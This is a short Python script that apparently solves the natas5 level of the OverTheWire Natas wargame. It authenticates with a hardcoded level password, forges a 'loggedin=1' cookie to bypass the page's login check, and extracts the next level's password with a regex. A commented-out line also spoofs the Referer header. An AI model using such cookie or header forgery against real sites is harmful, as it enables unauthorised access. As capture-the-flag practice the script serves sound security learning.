import requests
import re
username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
#custom_headers = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
url = "http://%s.natas.labs.overthewire.org" % username

custom_cookies = {"loggedin":"1"}

session = requests.Session()
response = session.get(url, auth = (username, password), cookies=custom_cookies)

content = response.text

#print(content)
print(re.findall('natas6 is (.*)', content)[0])
